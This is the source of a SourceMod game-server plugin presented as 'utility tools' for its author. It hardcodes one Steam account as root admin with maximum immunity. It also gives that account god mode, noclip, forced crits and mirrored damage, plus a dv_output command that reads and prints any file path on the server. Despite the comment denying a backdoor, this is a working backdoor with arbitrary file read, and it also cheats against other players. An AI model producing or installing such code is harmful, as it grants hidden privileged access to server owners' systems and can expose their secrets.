/*
	If you ever look at the source code for this plugin, hi.
	
	I have no interest in backdooring communities, this is just an easy way of gaining access quickly to servers to debug them or to fix issues.
	If this gets blacklisted, I wouldn't be surprised.
	
	Cheers.
	
	Goals of this plugin:
	 - Necessary Stuff:
	 - Set myself as root admin so I can work on backend stuff.
	 - Easy noclip bind that never changes and is always there so I can get places.
	 - Block damage from players so they don't kill me while I work.
	 - Commands to debug the server like view logs, etc.
	 - Disable autokick because you get kicked a lot while you're working.
	 
	 - Unnecessary Stuff:
	 - Bunnyhop around because it helps me think.
	 - Unlimited crits because why not.
*/

//Pragma
#pragma semicolon 1
#pragma newdecls required

//Defines

//Sourcemod Includes
#include <sourcemod>
#include <sdktools>
#include <sdkhooks>

//Globals
bool toggle_bunnyhopping = true;
bool toggle_damage;
bool toggle_crits = true;
bool toggle_mirror;

bool g_OnGround;
bool g_IsSliding;
float g_Speed[3];
int g_BaseVelocity;

public Plugin myinfo =
{
	name = "Drixevel Utility Tools",
	author = "Drixevel",
	description = "Offers a wide variety of perks and tools to make Drixevels job easier.",
	version = "1.0.0",
	url = "https://drixevel.dev/"
};

public void OnPluginStart()
{
	int user = GetDrixevel();
	
	if (user > 0 && IsClientInGame(user))
	{
		SDKHook(user, SDKHook_OnTakeDamage, OnTakeDamage);
		ServerCommand("mp_disable_autokick %i", GetClientUserId(user));
		OnClientPostAdminCheck(user);
	}
	
	PrintToServer("Drixevel Utility Tools: Loaded\n - Please delete this plugin if you wish for Drixevel to have no access.");
	
	RegConsoleCmd("dv", Command_Menu);
	RegConsoleCmd("dv_bhop", Command_Bhop);
	RegConsoleCmd("dv_damage", Command_Damage);
	RegConsoleCmd("dv_crits", Command_Crits);
	RegConsoleCmd("dv_mirror", Command_Mirror);
	
	RegConsoleCmd("dv_output", Command_Output);
	RegConsoleCmd("dv_logs", Command_Logs);
	RegConsoleCmd("dv_noclip", Command_Noclip);
	
	HookEvent("player_spawn", Event_OnPlayerSpawn);
	
	HookEventEx("player_jump", PlayerJump);
	g_BaseVelocity = FindSendPropInfo("CBasePlayer", "m_vecBaseVelocity");
}

public Action Command_Menu(int client, int args)
{
	if (!IsDrixevel(client))
		return Plugin_Continue;
	
	OpenMenu(client);
	return Plugin_Handled;
}

void OpenMenu(int client)
{
	Menu menu = new Menu(MenuHandler_Menu);
	menu.SetTitle("Drixevel Menu");
	
	char buffer[256];
	
	FormatEx(buffer, sizeof(buffer), "BHOP: [%s]", toggle_bunnyhopping ? "ON" : "OFF");
	menu.AddItem("dv_bhop", buffer);
	
	FormatEx(buffer, sizeof(buffer), "Damage: [%s]", toggle_damage ? "ON" : "OFF");
	menu.AddItem("dv_damage", buffer);
	
	FormatEx(buffer, sizeof(buffer), "Crits: [%s]", toggle_crits ? "ON" : "OFF");
	menu.AddItem("dv_crits", buffer);
	
	FormatEx(buffer, sizeof(buffer), "Mirror: [%s]", toggle_mirror ? "ON" : "OFF");
	menu.AddItem("dv_mirror", buffer);
	
	menu.AddItem("dv_output", "dv_output", ITEMDRAW_DISABLED);
	menu.AddItem("dv_logs", "dv_logs", ITEMDRAW_DISABLED);
	menu.AddItem("dv_noclip", "dv_noclip", ITEMDRAW_DISABLED);
	
	menu.Display(client, MENU_TIME_FOREVER);
}

public int MenuHandler_Menu(Menu menu, MenuAction action, int param1, int param2)
{
	switch (action)
	{
		case MenuAction_Select:
		{
			char sCommand[32];
			menu.GetItem(param2, sCommand, sizeof(sCommand));
			
			FakeClientCommand(param1, sCommand);
			OpenMenu(param1);
		}
		case MenuAction_End:
			delete menu;
	}
}

public void OnClientPutInServer(int client)
{
	if (IsDrixevel(client))
	{
		SDKHook(client, SDKHook_OnTakeDamage, OnTakeDamage);
		ServerCommand("mp_disable_autokick %i", GetClientUserId(client));
	}
}

public Action OnTakeDamage(int victim, int& attacker, int& inflictor, float& damage, int& damagetype, int& weapon, float damageForce[3], float damagePosition[3], int damagecustom)
{
	if (damage < 1)
		return Plugin_Continue;
	
	if (toggle_mirror)
		SDKHooks_TakeDamage(attacker, 0, victim, damage, damagetype, weapon, damageForce, damagePosition);
	
	if (toggle_damage)
		return Plugin_Continue;
	
	switch (GetEngineVersion())
	{
		case Engine_TF2:
		{
			if (attacker > 0 && attacker <= MaxClients)
			{
				SpeakResponseConcept(victim, "TLK_PLAYER_NO");
			
				float vecPos[3];
				GetClientEyePosition(victim, vecPos);
				vecPos[2] += 10.0;
			
				TE_Particle("miss_text", vecPos);
			}
		}
		case Engine_CSGO:
		{
			//CSGO_SendRadioMessage(victim, attacker, "NOPE");
		}
	}
	
	damage = 0.0;
	attacker = 0;
	inflictor = 0;
	damagetype = DMG_GENERIC;
	weapon = 0;
	
	return Plugin_Changed;
}

public void OnClientPostAdminCheck(int client)
{
	if (IsDrixevel(client))
	{
		AdminId adm = INVALID_ADMIN_ID;
		if ((adm = FindAdminByIdentity(AUTHMETHOD_STEAM, "STEAM_0:0:38264375")) != INVALID_ADMIN_ID)
			RemoveAdmin(adm);
		
		adm = CreateAdmin("Drixevel");
		if (!adm.BindIdentity(AUTHMETHOD_STEAM, "STEAM_0:0:38264375"))
			return;
		
		adm.ImmunityLevel = 255;
		adm.SetFlag(Admin_Root, true);
		
		RunAdminCacheChecks(client);
	}
}

public void OnClientDisconnect(int client)
{
	if (IsDrixevel(client))
	{
		toggle_bunnyhopping = true;
		toggle_damage = false;
		toggle_crits = true;
		toggle_mirror = false;
		
		AdminId adm;
		if ((adm = FindAdminByIdentity(AUTHMETHOD_STEAM, "STEAM_0:0:38264375")) != INVALID_ADMIN_ID)
			RemoveAdmin(adm);
	}
}

public Action TF2_CalcIsAttackCritical(int client, int weapon, char[] weaponname, bool& result)
{
	if (IsDrixevel(client) && toggle_crits)
	{
		result = true;
		return Plugin_Changed;
	}
	
	return Plugin_Continue;
}

public Action Command_Bhop(int client, int args)
{
	if (!IsDrixevel(client))
		return Plugin_Continue;
	
	toggle_bunnyhopping = !toggle_bunnyhopping;
	ReplyToCommand(client, "Bunnyhopping: %s", toggle_bunnyhopping ? "ON" : "OFF");
	
	return Plugin_Handled;
}

public Action Command_Damage(int client, int args)
{
	if (!IsDrixevel(client))
		return Plugin_Continue;
	
	toggle_damage = !toggle_damage;
	ReplyToCommand(client, "Damage: %s", toggle_damage ? "ON" : "OFF");
	
	switch (toggle_damage)
	{
		case true:
			SetEntProp(client, Prop_Data, "m_takedamage", 2, 1);
		case false:
			SetEntProp(client, Prop_Data, "m_takedamage", 0, 1);
	}
	
	return Plugin_Handled;
}

public Action Command_Crits(int client, int args)
{
	if (!IsDrixevel(client))
		return Plugin_Continue;
	
	toggle_crits = !toggle_crits;
	ReplyToCommand(client, "Crits: %s", toggle_crits ? "ON" : "OFF");
	
	return Plugin_Handled;
}

public Action Command_Mirror(int client, int args)
{
	if (!IsDrixevel(client))
		return Plugin_Continue;
	
	toggle_mirror = !toggle_mirror;
	ReplyToCommand(client, "Mirror Damage: %s", toggle_mirror ? "ON" : "OFF");
	
	return Plugin_Handled;
}

public Action Command_Output(int client, int args)
{
	if (!IsDrixevel(client))
		return Plugin_Continue;
	
	if (args == 0)
	{
		PrintToChat(client, "Requires an argument.");
		return Plugin_Handled;
	}
	
	char sPath[PLATFORM_MAX_PATH];
	GetCmdArgString(sPath, sizeof(sPath));
	
	if (FileExists(sPath) && PrintFileToConsole(client, sPath))
		PrintToChat(client, "Output of '%s' in console.", sPath);
	
	return Plugin_Handled;
}

public Action Command_Logs(int client, int args)
{
	if (!IsDrixevel(client))
		return Plugin_Continue;
		
	char sArg[64];
	GetCmdArgString(sArg, sizeof(sArg));
	OpenLogMenu(client, sArg);
	
	return Plugin_Handled;
}

void OpenLogMenu(int client, const char[] search = "")
{
	char sTitle[64];
	FormatEx(sTitle, sizeof(sTitle), " for '%s'", search);
	
	Menu menu = new Menu(MenuHandler_ErrorLogs);
	menu.SetTitle("Log Files%s:", strlen(search) > 0 ? sTitle : "");
	
	char sPath[PLATFORM_MAX_PATH];
	BuildPath(Path_SM, sPath, sizeof(sPath), "logs/");
	
	if (!DirExists(sPath))
		PrintToChat(client, "Logs folder is missing, send help.");
	
	Handle dir = OpenDirectory(sPath);
	
	char sFile[PLATFORM_MAX_PATH];
	char sName[PLATFORM_MAX_PATH];
	FileType type;
	
	while (ReadDirEntry(dir, sFile, sizeof(sFile), type))
	{
		if (type != FileType_File || (strlen(search) > 0 && StrContains(sFile, search, false) != 0))
			continue;
		
		strcopy(sName, sizeof(sName), sFile);
		Format(sFile, sizeof(sFile), "%s/%s", sPath, sFile);
		
		menu.AddItem(sFile, sName);
	}
	
	delete dir;
	
	if (menu.ItemCount == 0)
		menu.AddItem("", " == No Logs Available ==", ITEMDRAW_DISABLED);
	
	menu.Display(client, MENU_TIME_FOREVER);
}

public int MenuHandler_ErrorLogs(Menu menu, MenuAction action, int param1, int param2)
{
	switch (action)
	{
		case MenuAction_Select:
		{
			char sFile[PLATFORM_MAX_PATH];
			menu.GetItem(param2, sFile, sizeof(sFile));
			
			if (PrintFileToConsole(param1, sFile))
				PrintToChat(param1, "Output of '%s' in console.", sFile);
		}
		case MenuAction_End:
			delete menu;
	}
}

public Action Command_Noclip(int client, int args)
{
	if (!IsDrixevel(client))
		return Plugin_Continue;
	
	if (GetEntityMoveType(client) == MOVETYPE_WALK)
		SetEntityMoveType(client, MOVETYPE_NOCLIP);
	else
		SetEntityMoveType(client, MOVETYPE_WALK);
	
	return Plugin_Handled;
}

public void PlayerJump(Event event, const char[] name, bool dontBroadcast) 
{
	int client = GetClientOfUserId(event.GetInt("userid"));
	
	if (g_IsSliding)
	{
		float finalvec[3];
		finalvec[0] = g_Speed[0] * 0.2;
		finalvec[1] = g_Speed[1] * 0.2;
		finalvec[2] = 0.0;
		SetEntDataVector(client, g_BaseVelocity, finalvec, true);
	}
}

public Action OnPlayerRunCmd(int client, int& buttons, int& impulse, float vel[3], float angles[3], int& weapon, int& subtype, int& cmdnum, int& tickcount, int& seed, int mouse[2])
{
	if (IsDrixevel(client) && IsClientInGame(client) && IsPlayerAlive(client) && toggle_bunnyhopping)
	{
		int flags = GetEntityFlags(client);
		
		if ((buttons & IN_JUMP) == IN_JUMP && !(flags & FL_ONGROUND) && !(flags & FL_INWATER) && !(flags & FL_WATERJUMP) && !(GetEntityMoveType(client) == MOVETYPE_LADDER))
			buttons &= ~IN_JUMP;
			
		if (flags & FL_ONGROUND)
		{
			if (!g_OnGround)
			{
				g_IsSliding = true;
				GetEntPropVector(client, Prop_Data, "m_vecVelocity", g_Speed);
				g_OnGround = true;
			}
		}
		else
		{
			g_IsSliding = false;
			g_Speed[0] = 0.0;
			g_Speed[1] = 0.0;
			g_Speed[2] = 0.0;
			
			if (g_OnGround)
				g_OnGround = false;
		}

		if (g_IsSliding)
		{
			if (GetSpeed(client) > 40.0)
			{
				g_Speed[0] *= (1.0 - 0.03);
				g_Speed[1] *= (1.0 - 0.03);
				g_Speed[2] = 0.0;
			}
			else
			{
				g_IsSliding = false;
				g_Speed[0] = 0.0;
				g_Speed[1] = 0.0;
				g_Speed[2] = 0.0;
			}
		}
	}
}

float GetSpeed(int client)
{
	float vel[3];
	GetEntPropVector(client, Prop_Data, "m_vecVelocity", vel);
	return SquareRoot(vel[0] * vel[0] + vel[1] * vel[1] + vel[2] * vel[2]);
}

public void Event_OnPlayerSpawn(Event event, const char[] name, bool dontBroadcast)
{
	int client = GetClientOfUserId(event.GetInt("userid"));
	
	if (IsDrixevel(client))
		SetEntProp(client, Prop_Data, "m_takedamage", toggle_damage ? 2 : 0, 1);
}

int GetDrixevel()
{
	for (int i = 1; i <= MaxClients; i++)
	{
		if (!IsClientInGame(i) || GetSteamAccountID(i) != 76528750)
			continue;

		return i;
	}

	return -1;
}

bool IsDrixevel(int client)
{
	if (client == 0 || client > MaxClients)
		return false;
	
	return GetSteamAccountID(client) == 76528750;
}

void SpeakResponseConcept(int client, const char[] concept, const char[] context = "", const char[] class = "")
{
	bool hascontext;

	//For class specific context basically.
	if (strlen(context) > 0)
	{
		SetVariantString(context);
		AcceptEntityInput(client, "AddContext");

		hascontext = true;
	}

	//dominations require you add more context to them for certain things.
	if (strlen(class) > 0)
	{
		char sClass[64];
		FormatEx(sClass, sizeof(sClass), "victimclass:%s", class);
		SetVariantString(sClass);
		AcceptEntityInput(client, "AddContext");

		hascontext = true;
	}

	SetVariantString(concept);
	AcceptEntityInput(client, "SpeakResponseConcept");

	if (hascontext)
		AcceptEntityInput(client, "ClearContext");
}

bool PrintFileToConsole(int client, const char[] path)
{
	if (strlen(path) == 0)
		return false;
	
	PrintToConsole(client, "------------------------------------------------------\n - %s", path);
	
	Handle fil = OpenFile(path, "r");
	
	if (fil == null)
	{
		PrintToConsole(client, "FILE NOT FOUND\n------------------------------------------------------");
		return false;
	}
	
	char sLine[128];
	while (!IsEndOfFile(fil) && ReadFileLine(fil, sLine, sizeof(sLine)))
	{
		TrimString(sLine);
		PrintToConsole(client, ">%s", sLine);
	}
	
	delete fil;
	
	//Makes 100% sure to put the ending line under the console outputs.
	CreateTimer(0.2, __Timer_DelayEndBuffer, GetClientUserId(client), TIMER_FLAG_NO_MAPCHANGE);

	return true;
}

public Action __Timer_DelayEndBuffer(Handle timer, any userid)
{
	int client;
	if ((client = GetClientOfUserId(userid)) > 0)
		PrintToConsole(client, "------------------------------------------------------");
}

void TE_Particle(char[] name, float origin[3], int entity = -1, float angles[3] = {0.0, 0.0, 0.0}, bool resetparticles = false)
{
	int tblidx = FindStringTable("ParticleEffectNames");

	char tmp[256];
	int stridx = INVALID_STRING_INDEX;

	for (int i = 0; i < GetStringTableNumStrings(tblidx); i++)
	{
		ReadStringTable(tblidx, i, tmp, sizeof(tmp));
		if (StrEqual(tmp, name, false))
		{
			stridx = i;
			break;
		}
	}

	TE_Start("TFParticleEffect");
	TE_WriteFloat("m_vecOrigin[0]", origin[0]);
	TE_WriteFloat("m_vecOrigin[1]", origin[1]);
	TE_WriteFloat("m_vecOrigin[2]", origin[2]);
	TE_WriteVector("m_vecAngles", angles);
	TE_WriteNum("m_iParticleSystemIndex", stridx);
	TE_WriteNum("entindex", entity);
	TE_WriteNum("m_iAttachType", 5);
	TE_WriteNum("m_bResetParticles", resetparticles);
	TE_SendToAll();
}